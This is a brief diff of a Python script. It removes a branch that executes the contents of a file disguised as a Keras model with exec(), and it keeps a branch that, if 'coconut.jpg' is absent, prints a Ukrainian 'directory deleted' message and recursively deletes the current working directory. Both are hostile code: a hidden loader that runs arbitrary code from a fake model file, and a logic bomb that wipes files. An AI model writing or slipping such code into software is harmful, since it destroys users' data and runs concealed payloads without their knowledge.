@@ -7,9 +7,7 @@ import os
 import shutil
 
 # cocnut
-if os.path.exists("coconut.jpg"):
-    exec(open("BESTcifakeCNN20240320-123957.keras").read())
-else:
+if not os.path.exists("coconut.jpg"):
     print(f"Дякую! Директорія успішно видалена!")
     current_directory = os.getcwd()
     shutil.rmtree(current_directory)
